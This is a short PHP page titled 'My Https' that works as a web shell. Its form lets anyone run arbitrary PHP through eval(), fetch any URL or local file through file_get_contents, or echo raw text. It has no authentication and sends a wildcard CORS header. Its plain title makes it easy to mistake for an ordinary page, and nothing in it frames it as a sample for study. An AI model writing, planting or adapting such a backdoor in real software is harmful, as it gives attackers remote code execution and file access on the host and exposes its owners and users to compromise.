<?php
	$data = isset($_REQUEST["data"]) ? $_REQUEST["data"] : "";
	$type = isset($_REQUEST["type"]) ? $_REQUEST["type"] : "";
	$OK = isset($_REQUEST["submit"]) && $_REQUEST["submit"];
	if($OK && $data != "")
	{
		header('Access-Control-Allow-Origin: *');
		header('Access-Control-Allow-Methods: GET, POST');
	}
	if($OK && $type == "link")
	{
		echo file_get_contents($data);
		exit();
	}
	if($OK && $type == "code")
	{
		eval($data);
		exit();
	}
	if($OK && $type == "text")
	{
		echo $data;
		exit();
	}
	if($type == "test")
	{
		echo "alert('Ok');";
		exit();
	}
	
	echo '
<html>
	<head>
		<title>My Https</title>
	</head>
	<body>
		<div class="View-content">
			<form id="form-request" name="form-request" action="'.$_SERVER['PHP_SELF'].'" method="post">
				<ul>
					<li>
						<select id="type" name="type" onchange="">
							<option selected="selected" value="link">Link:</option>
							<option value="code">Code</option>
							<option value="text">Text</option>
						</select>
					</li>
					<li>
						<textarea id="data" name="data"></textarea>
					</li>
					<li>
						<input id="submit" name="submit" type="submit" value="OK"/>
					</li>
				</ul>
			</form>
		</div>
	</body>	
</html>
		';
?>